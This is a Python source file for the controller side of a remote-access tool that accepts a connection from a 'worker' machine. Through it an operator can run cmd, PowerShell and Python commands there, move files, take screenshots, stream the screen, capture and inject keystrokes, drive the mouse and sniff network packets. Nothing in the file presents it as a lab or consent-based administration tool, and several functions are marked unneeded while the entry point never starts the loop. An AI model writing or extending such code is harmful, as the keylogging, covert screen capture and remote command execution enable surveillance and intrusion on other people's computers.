import json
import socket
import time
import tkinter
from typing import Callable
import struct
import sys
import threading
import mouse
import cv2
import keyboard
import numpy as np

Commend = Callable[[],bytes]
# unneeded
RETURN = False
# unneeded
def cmd() -> bytes:
    global RETURN
    commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
    check_return(commend)
    if RETURN:
        return b""
    return b"cmd:"+commend.encode()
# unneeded
def powershell()->bytes:
    global RETURN
    commend = input("enter your wanted commend or enter \"return\" to return to menu: ")
    check_return(commend)
    if RETURN:
        return b""
    return b"powershell:"+commend.encode()
# unneeded
def python()->bytes:
    global RETURN
    print("enter your python code (end with an empty line) or enter \"return\" to return to menu: ")
    code = ""
    while True:
        line = sys.stdin.readline().strip()
        if not line:
            break
        check_return(line)
        if RETURN:
            return b""
        code += line + "\n"
    return b"python:"+code.encode()
# unneeded
def check_return(text:str):
    global RETURN
    if text == "return":
        RETURN = True

# unneeded
def receive_file() ->bytes:
    global RETURN
    file_path = input("enter the path of the file you want in the worker side or enter \"return\" to return to menu: ")
    check_return(file_path)
    if RETURN:
        return b""
    return b"receive_file:"+file_path.encode()

#unneeded
def send_file(file_path:str,name:bytes) ->bytes:
    try:
        with open(file_path, "rb") as file:
            file_bytes = file.read()
        if name == b"" or b"." not in name:
            return "error: please enter a valid name".encode()
        return name+b":"+file_bytes
    except FileNotFoundError:
        return f"error: file '{file_path}' does not exist.".encode()
    except PermissionError:
        return f"error: file '{file_path}' is not accessible (permission issue).".encode()
    except Exception as e:
        return f"error: {e}".encode()

# unneeded
def screen_shot() ->bytes:
    return b"screen_shot"
# unneeded
def exit_endless_print():
    msg = input("enter \"return\" to return to menu")
    check_return(msg)
# unneeded
def listen_to_keys()->bytes:
    return b"listen_to_keys"


#unneeded
def live_stream() -> bytes:
    return b"live_stream"
# unneeded
def press_key_in_worker() -> bytes:
    global RETURN
    print("every key you press will be pressed in worker, enter ctrl+q to quit to menu")
    while True:

        event = keyboard.read_event()
        if event.event_type == "down":
            if keyboard.is_pressed("ctrl") and keyboard.is_pressed("q"):
                RETURN = True
                return b""
            else:
                return b"press_key_in_worker:" + event.name.encode()
# unneeded
def control_mouse() -> bytes:
    global RETURN
    print("enter mouse parameters(you can enter \"return\" at any time to return to menu):")
    x = input("horizontal coordinate: ")
    check_return(x)
    if RETURN:
        return b""
    while not x.isdigit():
        x = input("please enter a number ")
    y = input("vertical coordinate: ")
    check_return(y)
    if RETURN:
        return b""
    while not y.isdigit():
        y = input("please enter a number ")
    button = input("which button do you want to press: ")
    check_return(button)
    if RETURN:
        return b""
    while button != "left" and button!="right":
        button = input("please enter left or right ")
    return b"control_mouse:"+x.encode()+b":"+y.encode()+b":"+button.encode()

# unneeded
def sniff_from_worker() ->bytes:
    print("please enter parameters(you can enter \"return\" at any time to return to menu):")
    scapy_filter = input("enter your filter for the sniffing: ")
    check_return(scapy_filter)
    if RETURN:
        return  b""
    scapy_time = input("enter how much you want the sniffing to continue:")
    check_return(scapy_time)
    if RETURN:
        return  b""
    while not scapy_time.isdigit():
        scapy_time = input("please enter a valid time  in numbers")
    scapy_amount = input("enter how much packets you want to sniff: ")
    check_return(scapy_amount)
    if RETURN:
        return  b""
    while not scapy_amount.isdigit():
        scapy_amount = input("please enter a valid time  in numbers")
    return b"sniff_from_worker:" + scapy_filter.encode() + b":" + scapy_time.encode() + b":" + scapy_amount.encode()

# unneeded
def save_file(received:bytes):
    file_name = input("how do you want to save your file?")
    while file_name == "" or "." not in file_name:
        file_name = input("please enter a valid name")
    with open(file_name,"wb") as file:
        file.write(received)





class Master:
    def __init__(self, ip:str, port:int):
        self.address = (ip,port)
        self.server = socket.socket()
        self.server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.server.bind(self.address)
        self.stream_server = socket.socket()
        self.stream_server.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        self.stream_server.bind((ip,port+1))
        self.server.listen()
        self.stream_server.listen()
        self.stream_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.client: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.functions: dict[str, Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
        self.exit:bool = False

        self._sock_lock = threading.RLock()
        self.on_stream_stop = None
        self.streaming = False
        self.control_key = False
        self.control_mouse = False
        self.last_frame_w = None
        self.last_frame_h = None
        self.last_display_w = None
        self.last_display_h = None
        self.last_x_offset = None
        self.last_y_offset = None
        self.display_scale = 1.0
        self._map_lock = threading.Lock()
        self.streaming = False
        self.control_mouse = False
        self.control_key = False


    def connect(self):
        self.client = self.server.accept()[0]
        print(self.client.recv(1024).decode())
        self.stream_client = self.stream_server.accept()[0]

    def recvall(self, sock: socket.socket, size: int) -> bytes:
        data = b""
        while len(data) < size:
            packet = sock.recv(size - len(data))
            if not packet:
                return b""
            data += packet
        return data

    def receiver(self, sock: socket.socket) -> bytes:
        raw_size = self.recvall(sock, 4)
        if not raw_size:
            return b""
        size = struct.unpack("I", raw_size)[0]
        if size == 0:
            return b""
        return self.recvall(sock, size)

    def sender(self, sock: socket.socket, message: bytes):
        data = struct.pack("I", len(message)) + message
        sock.sendall(data)


    def control_mouse_on_worker(self):
        def send_payload(payload: dict):
            data = json.dumps(payload).encode()
            with self._sock_lock:
                self.sender(self.client, b"control_mouse:" + data)
        def listen(event):
            if not self.control_mouse:
                return
            with self._map_lock:
                if not all(hasattr(self, a) for a in (
                "last_display_w", "last_display_h", "last_frame_w", "last_frame_h", "last_x_offset", "last_y_offset")):
                    return
            if isinstance(event, mouse.ButtonEvent):
                payload = {"type": "button", "action": event.event_type, "button": str(event.button)}
                send_payload(payload)
                return
            if isinstance(event, mouse.WheelEvent):
                payload = {"type": "wheel", "delta": float(event.delta)}
                send_payload(payload)
                return
            else:
                with self._map_lock:
                    dx = event.x - self.last_x_offset
                    dy = event.y - self.last_y_offset
                    if dx < 0 or dy < 0 or dx >= self.last_display_w or dy >= self.last_display_h:
                        return
                    norm_x = dx / float(self.last_display_w)
                    norm_y = dy / float(self.last_display_h)
                    orig_x = int(norm_x * self.last_frame_w)
                    orig_y = int(norm_y * self.last_frame_h)
                    orig_x = max(0, min(orig_x, self.last_frame_w - 1))
                    orig_y = max(0, min(orig_y, self.last_frame_h - 1))
                payload = {"type": "move_abs", "x": orig_x, "y": orig_y}
                send_payload(payload)
        mouse.hook(listen)
        while True:
            time.sleep(1)

    def control_keys(self):
        while True:
            if self.control_key:
                event = keyboard.read_event()
                with self._sock_lock:
                    self.sender(self.client,b"press_key_in_worker:" + event.event_type.encode() + b":" + event.name.encode())

            else:
                time.sleep(0.1)

    def show_stream(self):
        global RETURN
        root = tkinter.Tk()
        screen_w = root.winfo_screenwidth()
        screen_h = root.winfo_screenheight()
        root.destroy()
        while True:
            if self.streaming:
                self.sender(self.client,b"live_stream")
                frame_data = self.receiver(self.stream_client)

                if not frame_data:
                    time.sleep(0.05)
                    continue

                buf = np.frombuffer(frame_data, dtype=np.uint8)
                frame = cv2.imdecode(buf, cv2.IMREAD_COLOR)
                if frame is None:
                    time.sleep(0.005)
                    continue

                orig_h, orig_w = frame.shape[:2]

                scale = min(screen_w / orig_w, screen_h / orig_h)
                new_w, new_h = int(orig_w * scale), int(orig_h * scale)
                resized = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_CUBIC)

                canvas = np.zeros((screen_h, screen_w, 3), dtype=np.uint8)
                x_off = (screen_w - new_w) // 2
                y_off = (screen_h - new_h) // 2
                canvas[y_off:y_off + new_h, x_off:x_off + new_w] = resized
                with self._map_lock:
                    self.last_frame_w = orig_w
                    self.last_frame_h = orig_h
                    self.last_display_w = new_w
                    self.last_display_h = new_h
                    self.last_x_offset = x_off
                    self.last_y_offset = y_off

                cv2.imshow("Live Stream", canvas)
                try:
                    prop = cv2.getWindowProperty("Live Stream", cv2.WND_PROP_VISIBLE)
                except cv2.error:
                    prop = -1

                key = cv2.waitKey(1)
                if prop < 1 or key == ord("q"):
                    self.streaming = False
                    if callable(self.on_stream_stop):
                        self.on_stream_stop()
                        continue
                    try:
                        cv2.destroyWindow("Live Stream")
                    except cv2.error:
                        pass
                time.sleep(0.001)
            else:
                try:
                    cv2.destroyWindow("Live Stream")
                except cv2.error:
                    pass
                time.sleep(0.1)

        cv2.destroyAllWindows()


    def menu(self) ->str:
        print("which action do you want to do? ")
        i = 1
        for key in self.functions.keys():
            print(f"{i}: {key}")
            i+=1
        print(f"{len(self.functions.keys())+1}: quit")
        action = input("enter action name: ").replace(" ","_")
        while action not in self.functions.keys() and action != "quit":
            action = input("enter a valid name: ").replace(" ","_")
        return action


    def run2(self,function:str, message:bytes) -> bytes:
        if function == "quit":
            self.sender(self.client,"quit".encode())
            self.server.close()
            self.client.close()
            return "exited the worker".encode()
        if function == "send_file":
            splitted = message.decode().split(":")
            message = send_file(splitted[0],splitted[1].encode())
        if b"error:" in message:
            return message
        with self._sock_lock:
            self.sender(self.client, function.encode() + b":" + message)
            received = self.receiver(self.client)
        return received

    def run1(self,function:str,message:str):
        global RETURN
        self.connect()
        while function !="quit":
            if function == "listen_to_keys":
                t = threading.Thread(target=exit_endless_print, daemon=True)
                t.start()
                while not RETURN:
                    self.sender(self.client,message.encode())
                    received = self.receiver(self.client).decode()
                    if received:
                        print(received)
            if RETURN:
                RETURN = False
                function = self.menu()
                continue
            self.sender(self.client,message.encode())
            if function == "live_stream":
                self.show_stream()
                continue

            received = self.receiver(self.client)
            if b"error" == received[:5]:
                print(received.decode())
            elif function in ["receive_file","screen_shot"]:
                save_file(received)
                if function == "screen_shot":
                    function = self.menu()
                    continue
            elif function == "sniff_from_worker":
                name = input("enter input for file name(without extension)")
                while "." in name:
                    name = input("I said without extension")
                with open(name+".pcap","wb") as file:
                    file.write(received)
                    print("saved packets successfully")
            else:
                print(received.decode())
        self.sender(self.client,"quit".encode())
        self.server.close()
        self.client.close()



def main():
    functions: dict[str,Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
    master = Master("10.0.0.3",5555)

if __name__ == '__main__':
    main()